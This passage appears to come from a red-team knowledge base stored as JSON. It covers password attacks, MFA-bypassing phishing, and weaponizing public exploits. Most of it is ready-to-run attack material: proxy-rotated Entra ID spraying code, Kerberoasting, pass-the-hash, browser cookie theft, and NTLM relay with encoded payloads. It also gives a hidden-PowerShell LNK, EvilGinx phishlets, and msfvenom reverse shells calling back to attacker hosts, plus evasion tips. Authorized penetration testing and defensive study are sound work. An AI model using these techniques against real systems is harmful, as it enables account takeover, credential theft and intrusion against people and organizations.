You can't reconstruct the person from their fingerprint, but you can take 10 million known fingerprints and see if any match.\n\n**Common passwords that work in spraying:**\n- `Season+Year!` (Summer2025!, Winter2024!)\n- `Company+Year` (Corp2025, Acme2024)\n- `Welcome1`, `Password1`, `Changeme1`\n- The organization's name variations\n\n## ◈ INTERMEDIATE\n\nPassword attacks encompass credential stuffing, spraying, brute force, hash cracking, and credential reuse across services.\n\n## Password Spraying\n\nTest a small number of common passwords against many accounts to avoid lockouts:\n\n```bash\n# Against Microsoft 365 / Entra ID\nMSOLSpray.py -u users.txt -p 'Welcome2024!' -o sprayed.txt\n\n# Kerbrute (pre-auth, no lockout counter for some configs)\nkerbrute passwordspray -d target.local --dc dc01.target.local users.txt 'Summer2024!'\n\n# CrackMapExec against SMB\ncrackmapexec smb dc01.target.local -u users.txt -p 'Company123!' --continue-on-success\n\n# Against OWA\nruler --domain target.com brute --users users.txt --passwords passwords.txt --delay 3\n```\n\n**Lockout evasion**: Query the domain password policy first (`crackmapexec smb DC -u '' -p '' --pass-pol` or `Get-ADDefaultDomainPasswordPolicy`). Stay well below the threshold (e.g., 1 attempt per 35 minutes for a 30-minute lockout window). Use Kerbrute for AS-REP-based spraying which may not increment lockout counters depending on domain configuration.\n\nCommon spray passwords: `Season+Year!` (Summer2024!), `Company+Year`, `Welcome1`, `Password1`, `Changeme1`.\n\n## Hash Cracking\n\n**hashcat** is the primary GPU-accelerated cracking tool:\n\n```bash\n# NTLM (mode 1000)\nhashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/dive.rule\n\n# Kerberoasted tickets (mode 13100 for RC4, 19700 for AES)\nhashcat -m 13100 kerberoast.txt wordlist.txt -r OneRuleToRuleThemAll.rule\n\n# AS-REP roasted (mode 18200)\nhashcat -m 18200 asrep.txt wordlist.txt\n\n# NetNTLMv2 (mode 5600)\nhashcat -m 5600 responder_hashes.txt wordlist.txt\n\n# DCC2 / mscachev2 (mode 2100 — slow)\nhashcat -m 2100 cached_creds.txt wordlist.txt\n\n# bcrypt (mode 3200 — very slow)\nhashcat -m 3200 bcrypt_hashes.txt wordlist.txt\n```\n\n**John the Ripper** for format flexibility:\n\n```bash\njohn --wordlist=rockyou.txt --rules=All hashes.txt\njohn --format=krb5tgs --wordlist=wordlist.txt kerberoast.txt\n```\n\n**Hash identification**: Use `haiti` or `hashid` to determine the hash type:\n\n```bash\nhaiti 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'\n```\n\n## Kerberos Attacks\n\n**Kerberoasting** — request TGS tickets for service accounts and crack offline:\n\n```bash\n# Impacket\nGetUserSPNs.py target.local/user:password -dc-ip DC_IP -request -outputfile kerberoast.txt\n\n# Rubeus (from Windows)\nRubeus.exe kerberoast /outfile:kerberoast.txt\n\n# PowerView\nGet-DomainSPNTicket -OutputFormat hashcat\n```\n\n**ASREPRoasting** — target accounts without Kerberos pre-authentication:\n\n```bash\nGetNPUsers.py target.local/ -usersfile users.txt -no-pass -dc-ip DC_IP -outputfile asrep.txt\n```\n\n## Credential Harvesting\n\n**Browser credentials**:\n```bash\n# SharpChrome (Windows)\nSharpChrome.exe logins\nSharpChrome.exe cookies\n\n# HackBrowserData (cross-platform)\nhack-browser-data -b chrome\n```\n\n**Credential files to hunt**:\n- Windows: `%APPDATA%\\filezilla\\recentservers.xml`, `.rdg` files, KeePass `.kdbx`, `web.config`, `unattend.xml`\n- Linux: `.bash_history`, `.env`, `wp-config.php`, `.git-credentials`, `.netrc`, `.pgpass`, `settings.py`\n- Cloud: `~/.aws/credentials`, `~/.azure/accessTokens.json`, `~/.config/gcloud/credentials.db`\n\n**LAPS password retrieval** (if you have read access):\n```bash\n# From Linux\ncrackmapexec ldap DC -u user -p pass -M laps\n\n# PowerView\nGet-DomainComputer -Identity target -Properties ms-Mcs-AdmPwd\n```\n\n## Pass-the-Hash\n\nUse NTLM hashes directly without cracking:\n\n```bash\n# Impacket\npsexec.py -hashes :NTLM_HASH target.local/administrator@target_ip\nwmiexec.py -hashes :NTLM_HASH target.local/administrator@target_ip\nsmbexec.py -hashes :NTLM_HASH target.local/administrator@target_ip\n\n# CrackMapExec\ncrackmapexec smb target_ip -u administrator -H NTLM_HASH --exec-method smbexec -x 'whoami'\n\n# Evil-WinRM\nevil-winrm -i target_ip -u administrator -H NTLM_HASH\n```\n\n## Credential Stuffing\n\nUse leaked credential databases (breach compilations) to test password reuse:\n\n```bash\n# OpenBullet2 for high-speed credential testing\n# Configure target site login flow, set proxy list, load credentials\n```\n\nAlways check Have I Been Pwned API for known breaches associated with target email domains.\n\n## Default Credentials\n\nCheck databases like **DefaultCreds-Cheat-Sheet**, **CIRT.net**, and vendor documentation. Common targets: network devices (admin/admin), web management interfaces, IPMI/iDRAC/iLO, printers, IoT devices, database servers.\n\n## OpSec Notes\n\n- Password spraying against cloud services is logged (Entra ID Sign-In logs) — use residential proxies\n- Kerbrute AS-REP requests may be less visible than LDAP-based spraying\n- Crack hashes on dedicated GPU rigs, not on target infrastructure\n- Rotate source IPs between spray attempts for cloud targets\n- Monitor for smart lockout (Entra ID) which applies per-IP lockout\n\n---\n\n## MFA Fatigue (Push Bombing)\n\nMFA push bombing overwhelms a user with authentication requests until they approve one:\n\n```bash\n# Technique:\n# 1. Obtain valid credentials (from breach data, password spray, phishing)\n# 2. Continuously trigger MFA push notifications to victim's phone\n# 3. Victim fatigued by repeated prompts → approves to make it stop\n# 4. Attacker gains authenticated session\n\n# Number Matching (mitigates push bombing): forces user to enter displayed number\n# Newer Microsoft Authenticator / Okta Verify: number matching + context (location, app)\n# Without these: push bombing highly effective\n\n# Combined vishing + push bombing:\n# Call victim posing as IT: \"We're testing your account — you'll receive a push, approve it\"\n# Victim approves → attacker in\n\n# MFA bypass via legacy protocols:\n# Microsoft: Basic Auth / SMTP / POP3 / IMAP / ActiveSync may bypass MFA\n# Test: use spray-owa or MailSniper against Exchange legacy endpoints\npython3 MailSniper.py -smtp mail.corp.com -domain corp.com -userlist users.txt \\\n -password Password123 -ExchHostname owa.corp.com\n```\n\n---\n\n## Phishing-Resistant MFA Bypass (Device Code Flow)\n\nOAuth 2.0 device code phishing — legitimate flow, abused for AiTM:\n\n```bash\n# The device code flow:\n# 1. Attacker initiates device authorization: POST /oauth2/devicecode\n# → receives user_code (e.g., \"ABCD-1234\") and verification_uri\n# 2. Attacker emails victim: \"Please visit https://microsoft.com/devicelogin and enter ABCD-1234\"\n# 3. Victim completes MFA on REAL Microsoft site → attacker polls and gets real tokens\n# 4. No phishing domain needed — victim authenticates to legitimate Microsoft URL\n\npython3 squarephish.py -e victim@corp.com --config config.ini\n# Sends email with device code → polls for completion → steals OAuth tokens\n```\n\n## ◈ ADVANCED\n\n### Cloud Identity Provider Spraying at Scale\n\nEntra ID and Okta rate-limit login attempts per IP. Bypass with distributed spraying:\n\n```python\nimport asyncio, httpx, json\n\nasync def spray_entra(user, password, proxy_pool):\n \"\"\"Spray a single credential pair through rotating proxies\"\"\"\n proxy = next(iter(proxy_pool))\n url = \"https://login.microsoftonline.com/common/oauth2/v2.0/token\"\n data = {\n \"client_id\": \"1b730954-1685-4b74-9bfd-dac224a7b894\", # Azure PowerShell client\n \"grant_type\": \"password\",\n \"username\": user,\n \"password\": password,\n \"scope\": \"openid profile offline_access\"\n }\n async with httpx.AsyncClient(proxies={\"all://\": proxy}) as client:\n r = await client.post(url, data=data)\n result = r.json()\n if \"access_token\" in result:\n return {\"status\": \"SUCCESS\", \"user\": user, \"tokens\": result}\n elif result.get(\"error\") == \"invalid_grant\":\n if \"AADSTS50076\" in result.get(\"error_description\", \"\"):\n return {\"status\": \"MFA_REQUIRED\", \"user\": user} # Valid creds!\n return {\"status\": \"INVALID\"}\n elif result.get(\"error\") == \"interaction_required\":\n return {\"status\": \"VALID_CONDITIONAL_ACCESS\", \"user\": user}\n```\n\n`AADSTS50076` = password correct but MFA required — valid credential found.\n\n### Kerberoasting AES vs RC4\n\nModern domains enforce AES256 tickets only. RC4 (etype 23) tickets are faster to crack:\n\n```bash\n# Force RC4 ticket request (will fail on RC4-disabled domains)\nRubeus.exe kerberoast /rc4opsec /outfile:rc4_tickets.txt\n\n# If RC4 disabled, crack AES256 (mode 19700 — much slower)\nhashcat -m 19700 aes_tickets.txt wordlist.txt --force\n\n# Pre-filter by account age — service accounts with passwords set 5+ years ago\n# are more likely to use weak passwords\nGetUserSPNs.py target.local/user:pass -dc-ip DC_IP -request \\\n | grep -A5 \"pwdLastSet.*201[0-9]\"\n```\n\n### Token Theft via Browser Cookie Extraction\n\nNTLM hashes and Kerberos tickets are powerful, but OAuth/OIDC tokens from browsers are often more valuable for cloud access:\n\n```bash\n# Chrome cookie database (DPAPI-encrypted on Windows)\n# Decrypt using SharpChrome which handles DPAPI automatically\nSharpChrome.exe cookies /target:https://login.microsoftonline.com /format:json\n\n# Extract from memory with direct DPAPI call\nSharpDPAPI.exe cookies /target:C:\\Users\\user\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies\n\n# Firefox cookies (unencrypted SQLite, or key4.db encrypted)\nsqlite3 \"C:\\Users\\user\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*.default\\cookies.sqlite\" \\\n \"SELECT host, name, value FROM moz_cookies WHERE host LIKE '%.microsoft.com%'\"\n```\n\nStolen M365 session cookies bypass MFA entirely — valid until token expiry (typically 1-90 days).\n\n### Hash Relay Without Cracking\n\nMany NTLM hashes in enterprise environments are too complex to crack. Relay them instead:\n\n```bash\n# impacket ntlmrelayx: relay captured hashes to other services\nntlmrelayx.py -tf targets.txt -smb2support -c \"powershell -enc BASE64_PAYLOAD\"\n\n# Combine with Responder (poisoner) to capture hashes\n# Responder on one terminal, ntlmrelayx on another\n# They share a port — disable Responder's SMB/HTTP servers\nsed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf\nsed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf\nresponder -I eth0 -rdwv &\nntlmrelayx.py -tf smb_targets.txt -smb2support\n```\n\n### Custom Hashcat Rules for Target-Specific Cracking\n\nGeneric wordlists + rules crack ~30-40% of enterprise hashes. Improve with target-specific wordlists:\n\n```bash\n# Build a custom wordlist from the target's public presence\ncewl https://target.com -d 3 -m 5 -w target_words.txt\ncewl https://jobs.target.com -d 2 -m 4 >> target_words.txt\n\n# Add known naming conventions (from LinkedIn/email headers)\necho \"Acme\" >> custom.txt\necho \"AcmeCorp\" >> custom.txt\n\n# Apply corporate password policy rules\ncat > policy_rules.rule << 'EOF'\n$1 $! # Append 1!\n$2 $0 $2 $4 $! # Append 2024!\n^A ^c ^m ^e # Prepend \"Acme\"\nEOF\n\nhashcat -m 1000 hashes.txt custom.txt -r policy_rules.rule\n```\n\nTarget-specific rules typically increase crack rates to 60-75% for enterprise NTLM hashes.", "last_updated": "2026-03-18"}, "phishing-advanced": {"slug": "phishing-advanced", "title": "Advanced Phishing Techniques", "category": "Initial Access", "content": "# Advanced Phishing Techniques\n\n## ◈ BEGINNER\n\n### What is Phishing?\n\nPhishing is tricking people into taking an action that benefits an attacker — clicking a link, opening a file, entering credentials, or approving an authentication request.\n\n**Key terms:**\n- **Credential harvesting** — capturing a victim's username and password via a fake login page\n- **Payload delivery** — getting a malicious file onto the victim's computer\n- **MFA bypass** — getting around multi-factor authentication (the second verification step)\n- **Reverse proxy phishing (AiTM)** — a technique where your phishing server sits between the victim and the real login page, capturing credentials AND the session token after MFA is completed\n- **HTML smuggling** — hiding a malicious file inside an HTML email attachment, assembled in the browser to bypass email security\n- **MotW** — Mark of the Web; a Windows flag on downloaded files that triggers security warnings\n- **DMARC/SPF/DKIM** — email authentication standards; if not configured strictly, allow domain spoofing\n\n**Why is MFA bypass important?**\nMany organizations have deployed MFA thinking it's a complete defense. AiTM (Adversary-in-the-Middle) phishing defeats standard MFA (TOTP, push notifications, SMS) by intercepting the authenticated session *after* the user successfully logs in with their second factor. The attacker gets a valid logged-in session without knowing the MFA secret.\n\n**What is a \"pretext\"?** The fictional story you create to make the phishing scenario believable. Good pretexts exploit urgency (\"your account will be locked\"), authority (\"this is IT security\"), or context (\"your performance review is ready\").\n\n**Analogy:** Reverse proxy phishing is like a fake ATM that looks identical to a real one. You insert your card, enter your PIN (MFA), and the fake ATM hands your card back — but it recorded everything and can now use your card at real ATMs.\n\n**Modern email security layers to bypass:**\n- Anti-spam (SPF/DKIM/DMARC check)\n- URL reputation (sandbox checks links)\n- File attachment scanning\n- Safe Links (Microsoft Defender) — rewrites URLs, checks at click time\n- Safe Attachments — detonates attachments in sandbox\n\n## ◈ INTERMEDIATE\n\nModern phishing goes far beyond simple credential harvesting emails. This covers MFA-bypassing reverse proxy phishing, payload delivery via container formats, and social engineering across multiple channels.\n\n## Reverse Proxy Phishing (MFA Bypass)\n\n**EvilGinx2** acts as a transparent reverse proxy between the victim and the real login page, capturing session tokens after MFA completion:\n\n```bash\n# EvilGinx2 setup\nevilginx2 -p /path/to/phishlets\n\n# Configure phishlet for target\nphishlets hostname o365 login.target-corp.com\nphishlets enable o365\n\n# Create lure\nlures create o365\nlures get-url 0\n```\n\nThe victim sees the real login page, enters credentials and MFA, and EvilGinx captures the authenticated session cookie. This defeats TOTP, SMS, push notification, and FIDO2 (when not bound to origin). **Modlishka** provides similar functionality with a different architecture.\n\nKey considerations:\n- Domain must be categorized and aged to avoid phishing page blocks\n- TLS certificate must be valid (Let's Encrypt)\n- Some targets enforce token binding or client certificate mutual TLS, which defeats proxy phishing\n\n## HTML Smuggling\n\nDeliver payloads through email filters by constructing the file client-side via JavaScript:\n\n```html\n\n\n\n```\n\nThe ISO/IMG file bypasses Mark-of-the-Web (MotW) since container formats do not propagate the zone identifier to contained files. This was the dominant initial access technique in 2022-2023 before Microsoft patched MotW propagation for ISO files.\n\n## Container Format Delivery\n\n**ISO/IMG files**: Mount as virtual drives, contained executables lack MotW. Microsoft patched this in November 2022 but bypasses continue to emerge.\n\n**OneNote (.one) files**: Weaponized in early 2023 by embedding HTA/BAT/CMD/VBS files behind a fake button overlay. Microsoft added file extension blocking in March 2023.\n\n**CHM files**: Compiled HTML help files execute JavaScript via `ActiveXObject`. Often overlooked by email filters.\n\n**LNK files**: Windows shortcuts with embedded commands:\n\n```\n# Create weaponized LNK\n$s = New-Object -ComObject WScript.Shell\n$lnk = $s.CreateShortcut(\"C:\\temp\\Document.lnk\")\n$lnk.TargetPath = \"C:\\Windows\\System32\\cmd.exe\"\n$lnk.Arguments = \"/c powershell -ep bypass -w hidden -e BASE64PAYLOAD\"\n$lnk.IconLocation = \"C:\\Windows\\System32\\shell32.dll,1\"\n$lnk.Save()\n```\n\n## Office Macro Techniques\n\n**VBA Stomping**: Remove the VBA source code from the Office document while keeping the compiled p-code. AV scanners that analyze source code miss the actual payload. Use tools like `EvilClippy`.\n\n**Remote Template Injection**: The document fetches a macro-enabled template at runtime:\n\n```xml\n\n\n```\n\nThe initial document contains no macros (bypasses static scanning) and pulls the weaponized template only when opened.\n\n**XLM (Excel 4.0) Macros**: Legacy macro format less analyzed by AV than VBA. Use `Auto_Open` in a macro sheet.\n\n## Browser-in-the-Browser (BitB)\n\nCreate a fake browser window (popup) within the page using CSS/HTML to mimic an OAuth login prompt. The victim sees a legitimate-looking URL in the fake address bar. Effective for OAuth phishing against Google, Microsoft, and other SSO providers.\n\n## Gophish Campaign Management\n\n```bash\n# Launch Gophish\n./gophish\n\n# Configure via API or web UI:\n# 1. Sending profile (SMTP server)\n# 2. Landing page (clone with credentials capture)\n# 3. Email template (HTML with tracking pixel and link)\n# 4. User group (target email list)\n# 5. Campaign launch with scheduling\n```\n\nTrack opens, clicks, and credential submissions. Use tracking pixels for engagement metrics.\n\n## Alternative Channels\n\n**QR Code Phishing (Quishing)**: Embed malicious URLs in QR codes sent via email or physical media. Bypasses URL scanning since the link exists as an image. Mobile devices often lack corporate security controls.\n\n**Vishing**: Voice phishing with pretexting. Call targets claiming to be IT support, request they navigate to a credential harvesting page or install remote access software.\n\n**SMS Smishing**: Use Twilio or similar APIs to send SMS with shortened malicious URLs. Mobile browsers show less URL context.\n\n**Teams/Slack Phishing**: Guest access features allow external users to send messages. Combine with domain impersonation for trusted-looking messages within the collaboration platform.\n\n## OpSec Notes\n\n- Age phishing domains 30+ days minimum; categorize via Cloudflare/Symantec/Bluecoat\n- Use legitimate email infrastructure (SendGrid, Mailgun) for deliverability\n- EvilGinx phishlets should match target's login page version — test before deployment\n- Rotate phishing infrastructure after each campaign to avoid blocklisting\n- Strip metadata from all Office documents before sending\n\n## Detection Notes\n\nReverse proxy phishing is detected by: impossible travel (login from unexpected geo), token replay detection, device compliance checks, and FIDO2 origin binding. Email gateways detect HTML smuggling via JavaScript analysis. Modern sandboxes detonate container files. Defender for Office 365 detects known phishlet signatures in URLs.\n\n---\n\n## QR Code Phishing (Quishing)\n\nQR codes bypass URL filters and email security gateways that don't analyze image content:\n\n```python\nimport qrcode\nimg = qrcode.make(\"https://phish-domain.com/o365-login\")\nimg.save(\"qr_code.png\")\n```\n\nDelivery scenarios:\n- Embed in PDF \"Your password is expiring — scan to reset\"\n- Print and plant in office environments (conference rooms, printers)\n- Send in calendar invites as \"scan to join meeting\"\n- SMS with image attachment — mobile devices often auto-open QR scanners\n\n## Email Header Spoofing and Authentication\n\nUnderstanding email authentication to craft convincing lures:\n\n```bash\n# Check SPF record\ndig TXT target.com | grep \"v=spf1\"\n\n# Check DMARC policy\ndig TXT _dmarc.target.com\n\n# Check DKIM selector\ndig TXT selector1._domainkey.target.com\n\n# p=none → report only, emails accepted even if spoofed\n# p=quarantine → spoofed emails go to spam\n# p=reject → spoofed emails rejected\n```\n\nIf DMARC is `p=none` or missing: direct domain spoofing may succeed. Send test to mail-tester.com first.\n\n## ◈ ADVANCED\n\n### FIDO2 Phishing — The Remaining Attack Surface\n\nFIDO2 hardware keys (YubiKey) are origin-bound and resist standard AiTM proxying. However, gaps remain:\n\n**Attacker-in-the-Middle at the OS level**: If endpoint is compromised before FIDO2 auth, tokens can be intercepted at the browser API level before they reach the key.\n\n**Social engineering for key tap**: \"We need to verify your security key — please tap it now\" in a vishing scenario while attacker has the victim's password and is waiting at the authentication step.\n\n**Passkey phishing via app confusion**: Mobile passkeys are bound to the relying party identifier, but users can be confused into using the wrong app.\n\n**Backup code phishing**: Most FIDO2 deployments offer backup recovery codes. Phish for the backup code rather than the key:\n```\n\"Your YubiKey has been reported as potentially compromised. Enter your backup recovery code to verify account ownership.\"\n```\n\n### Transparent Proxy Phishing with Custom Phishlets\n\nBuild custom EvilGinx phishlets for targets without existing ones:\n\n```yaml\n# custom_phishlet.yaml\nname: 'target-sso'\nproxy_hosts:\n - phish_sub: 'login'\n orig_sub: 'login'\n domain: 'target.com'\n session: true\n is_landing: true\n auto_filter: true\nsub_filters:\n - triggers_on: 'login.target.com'\n orig_sub: 'login'\n domain: 'target.com'\n search: 'action=\"https://login.target.com/'\n replace: 'action=\"https://{hostname}/'\n mimes: ['text/html']\nauth_tokens:\n - domain: '.target.com'\n keys: ['session', 'auth_token', '.AspNet.Cookies']\ncredentials:\n username:\n key: 'username'\n search: ['(.+)']\n type: 'post'\n password:\n key: 'password'\n search: ['(.+)']\n type: 'post'\n```\n\n### Domain Aging and Reputation Warming\n\nFresh domains are immediately blocked by email gateways and browser reputation systems. Automate reputation building:\n\n```python\n# reputation_prewarmer.py (simplified)\nimport requests, time, random\n\nDOMAIN = \"corp-helpdesk-portal.com\"\nCATEGORIES = [\"business\", \"technology\", \"enterprise\"]\n\ndef warm_domain():\n # 1. Register with Cloudflare (gets initial categorization)\n # 2. Create legitimate-looking content (LinkedIn-like company page)\n # 3. Submit for categorization to major vendors\n for vendor_api in [\"bluecoat\", \"symantec\", \"fortiguard\"]:\n submit_for_categorization(DOMAIN, vendor_api, CATEGORIES)\n\n # 4. Generate organic-looking traffic\n for _ in range(100):\n ua = random.choice(USER_AGENTS)\n requests.get(f\"https://{DOMAIN}/\", headers={\"User-Agent\": ua})\n time.sleep(random.uniform(30, 120)) # Human-like intervals\n```\n\nStart domain aging 30-45 days before planned campaign.\n\n### Microsoft Entra ID Conditional Access Bypass\n\nEven with strong conditional access policies, gaps exist:\n\n**Legacy auth protocols**: Many tenants still have Exchange ActiveSync enabled. These protocols bypass MFA:\n```bash\n# Test if legacy auth is enabled\npython3 sprayhound.py -U users.txt -P 'Password123' \\\n --protocol activesync --domain target.onmicrosoft.com\n```\n\n**Compliant device bypass via enrollment**: Enroll an attacker-controlled device as \"compliant\" using stolen credentials + MFA:\n```bash\n# Use stolen credentials to enroll device before conditional access triggers\n# Requires: valid creds + MFA + tenant allows user-driven enrollment\nroadrecon auth --device-id fake-device-$(uuidgen) \\\n --username victim@target.com --password 'Password1'\n```\n\n**CAE (Continuous Access Evaluation) evasion**: Tokens are valid for ~60-90 minutes even after sign-out is triggered. Use stolen tokens within this window.\n\n### Payload Obfuscation Chain\n\nLayer multiple obfuscation techniques to defeat sandbox detonation:\n\n```\nStage 0: HTML attachment (no file on disk, assembled in browser)\n ↓ drops\nStage 1: Password-protected ZIP (sandboxes can't detonate)\n ↓ extracts to\nStage 2: LNK file (triggers PowerShell)\n ↓ downloads\nStage 3: DLL side-loaded via legitimate signed binary\n ↓ reflective loads\nStage 4: Agent in memory (no disk artifact)\n```\n\nEach layer adds analysis complexity. Password-protected archives defeat automated sandbox detonation — the password is visible in the email body but requires human analyst time.", "last_updated": "2026-03-18"}, "public-exploits": {"slug": "public-exploits", "title": "Using Public Exploits", "category": "Initial Access", "content": "# Using Public Exploits\n\n## ◈ BEGINNER\n\n### What are Public Exploits?\n\nA vulnerability is a flaw in software that can be abused. An exploit is code that takes advantage of that vulnerability. Public exploits are exploits that have been discovered and published — anyone can download and use them.\n\n**Key terms:**\n- **CVE** — Common Vulnerabilities and Exposures; a unique ID assigned to each known vulnerability (e.g., `CVE-2021-44228` = Log4Shell)\n- **CVSS score** — a number from 0-10 rating vulnerability severity (7+ = high, 9+ = critical)\n- **PoC** — Proof of Concept; code that demonstrates a vulnerability is real, often just shows it's possible (opens calculator, pings attacker)\n- **ExploitDB** — a searchable archive of public exploit code\n- **Metasploit** — a framework that packages exploits into easy-to-use modules\n- **Zero-day** — a vulnerability with no public patch; very different from public exploits which have patches available\n- **CISA KEV** — Known Exploited Vulnerabilities catalog; vulnerabilities confirmed to be actively exploited in real attacks\n- **Weaponization** — converting a PoC (which just proves the bug) into an operational exploit (which delivers your payload)\n\n**The exploit lifecycle:**\n1. Researcher discovers vulnerability\n2. CVE ID assigned\n3. Vendor releases patch\n4. PoC code published (sometimes before patch)\n5. Exploit integrated into Metasploit / public tools\n6. Organizations that haven't patched remain vulnerable\n\n**Why do organizations stay vulnerable?** Patching takes time and risks breaking things. Large organizations may have thousands of systems. Some systems can't be easily patched (OT, embedded, legacy). This gap between patch release and deployment is your exploitation window.\n\n**Analogy:** Imagine a building with a known broken lock that was just announced publicly. Every locksmith (attacker) now knows about it. Some building owners patch it immediately; others take weeks or never do. Public exploits are the published instructions for using that broken lock.\n\n**Safe exploit usage:**\n- Always test in a lab first — real exploits can crash production systems\n- Memory corruption exploits (buffer overflows) often crash the target if they fail\n- Never run kernel exploits on production systems without explicit authorization\n\n## ◈ INTERMEDIATE\n\nLeveraging known vulnerabilities and public exploit code for initial access. Covers discovery, weaponization, and safe execution.\n\n## Vulnerability Discovery\n\n**searchsploit** (offline ExploitDB mirror):\n```bash\nsearchsploit apache 2.4\nsearchsploit -x 12345 # examine exploit\nsearchsploit -m 12345 # mirror/copy exploit locally\nsearchsploit --nmap nmap.xml # parse Nmap XML for matching exploits\n```\n\n**Online databases**: ExploitDB, PacketStorm, NVD, GitHub (search for CVE-YYYY-XXXX), Nuclei templates repository, 0day.today.\n\n**CVE prioritization**: Focus on vulnerabilities that are: (1) remotely exploitable without authentication, (2) affect target's identified technology stack, (3) have public PoC code, (4) rated CVSS 7.0+ or have known exploitation in the wild (CISA KEV catalog).\n\n## Metasploit Framework\n\n```bash\nmsfconsole\n\n# Search for modules\nsearch type:exploit name:apache\nsearch cve:2024\n\n# Standard exploitation workflow\nuse exploit/multi/http/apache_mod_cgi_bash_env_exec\nset RHOSTS target.com\nset RPORT 443\nset SSL true\nset LHOST attacker.com\nset LPORT 443\nset PAYLOAD linux/x64/meterpreter/reverse_https\nexploit\n\n# Useful auxiliary scanners\nuse auxiliary/scanner/smb/smb_ms17_010\nuse auxiliary/scanner/http/ssl_version\nuse auxiliary/scanner/ssh/ssh_version\n\n# Post-exploitation modules\nuse post/multi/gather/credentials\nuse post/windows/gather/hashdump\nuse post/linux/gather/enum_system\n```\n\n**Payload generation with msfvenom**:\n```bash\n# Windows\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=attacker LPORT=443 -f exe -o payload.exe\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=attacker LPORT=443 -f dll -o payload.dll\n\n# Linux\nmsfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f elf -o payload.elf\n\n# Web payloads\nmsfvenom -p php/meterpreter_reverse_tcp LHOST=attacker LPORT=4444 -f raw > shell.php\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=attacker LPORT=4444 -f raw > shell.jsp\n```\n\n## Weaponizing PoC Code\n\nRaw PoC code from GitHub/ExploitDB often requires modification for operational use:\n\n1. **Read the code thoroughly** — understand the vulnerability mechanism, not just the trigger\n2. **Test in a lab** — set up a matching version of the vulnerable software\n3. **Modify payload delivery** — replace calc.exe/notepad.exe with your shellcode or C2 callback\n4. **Handle errors gracefully** — add exception handling to prevent target crashes\n5. **Remove indicators** — change default User-Agent strings, remove author signatures, randomize sleep timers\n6. **Add cleanup** — restore overwritten memory/state if possible to maintain target stability\n\n## Exploit Chaining\n\nSingle vulnerabilities often provide limited access. Chain them for full impact:\n\n- **SSRF → Cloud credential theft → Lateral movement**: SSRF to IMDSv1 → AWS keys → access other services\n- **SQLi → File write → RCE**: SQL injection to write a web shell via `INTO OUTFILE` or `COPY TO`\n- **LFI → Log poisoning → RCE**: Include access log after injecting PHP via User-Agent header\n- **XSS → CSRF → Admin account creation**: Steal admin CSRF token via XSS, then create a backdoor admin account\n- **Open redirect → OAuth token theft**: Chain open redirect in OAuth callback to steal authorization codes\n\n## Nuclei for Automated Vulnerability Scanning\n\n```bash\n# Update templates\nnuclei -update-templates\n\n# Scan with all templates\nnuclei -u https://target.com -t /path/to/nuclei-templates/ -severity critical,high\n\n# Specific template categories\nnuclei -l urls.txt -t cves/ -t exposures/ -t misconfiguration/ -o nuclei_results.txt\n```\n\nNuclei provides lower false-positive rates than traditional scanners and covers recently disclosed CVEs quickly via community template updates.\n\n## OpSec Notes\n\n- Always test exploits in a lab environment matching the target version before live engagement\n- Metasploit signatures are heavily detected — consider using standalone exploit code or custom implementations\n- msfvenom payloads are signatured by every AV — use custom shellcode or obfuscation\n- Document every exploit attempt for the engagement report, including failed attempts\n- Have a rollback plan for exploits that may destabilize the target (especially memory corruption bugs)\n- Avoid kernel exploits on production systems unless explicitly authorized\n\n## Common Vulnerability Classes\n\n### Remote Code Execution via Deserialization\n\nJava deserialization vulnerabilities affect: Apache Struts, Jenkins, WebLogic, JBoss, Spring.\n\n```bash\n# ysoserial payloads\njava -jar ysoserial.jar CommonsCollections6 'curl http://LHOST/callback' | base64\n\n# JNDI injection (Log4Shell-style)\ncurl 'https://target.com/app' -H 'X-Api-Version: ${jndi:ldap://LHOST:1389/a}'\n```\n\n### SQL Injection to RCE\n\nWhen database user has file read/write privileges:\n\n```sql\n-- MySQL: write web shell (requires FILE privilege + writable webroot)\nSELECT '' INTO OUTFILE '/var/www/html/shell.php';\n\n-- MSSQL: enable xp_cmdshell\nEXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\nEXEC xp_cmdshell 'whoami';\n\n-- PostgreSQL: COPY command for file write\nCOPY (SELECT '') TO '/var/www/html/shell.php';\n```\n\n### Server-Side Template Injection (SSTI)\n\nDetection payloads by template engine:\n\n```\nJinja2 (Python): {{7*7}} → 49\nTwig (PHP): {{7*7}} → 49\nFreeMarker (Java): ${7*7} → 49\nSmarty (PHP): {$smarty.version}\nERB (Ruby): <%= 7*7 %>\n```\n\n## CVE-to-Exploit Workflow\n\n```bash\n# 1. Identify target software versions\nnmap -sV --version-intensity 5 TARGET_IP\n\n# 2. Search for CVEs\nsearchsploit \"Apache 2.4.49\"\n\n# 3. Check CISA KEV for confirmed exploitation\ncurl https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json | \\\n python3 -c \"import json,sys; data=json.load(sys.stdin); [print(v['cveID'],v['shortDescription']) for v in data['vulnerabilities'] if 'apache' in v['vendorProject'].lower()]\"\n\n# 4. Get and review PoC\nsearchsploit -m 50383\ncat 50383.py | head -30\n\n# 5. Lab test before live engagement\ndocker run -p 8080:80 vulnerable/apache:2.4.49\npython3 50383.py http://localhost:8080/ /bin/id\n\n# 6. Modify for operational payload\n# Replace PoC command with stager\n```\n\n## ◈ ADVANCED\n\n### Patch Diff Analysis for 0-day Development\n\nWhen a vendor releases a patch without immediately publishing CVE details, analyze the diff to develop an exploit before the full disclosure:\n\n```bash\n# Download both versions\nwget https://vendor.com/app-v1.2.3.tar.gz\nwget https://vendor.com/app-v1.2.4.tar.gz # patched version\n\n# Binary diff (for compiled software)\nbindiff old_binary new_binary\n\n# Source diff\ndiff -ru app-v1.2.3/src/ app-v1.2.4/src/ | grep -A10 \"^+.*[Ss]anitiz\\|[Cc]heck\\|[Vv]alidat\"\n\n# What changed in security-relevant code?\n# 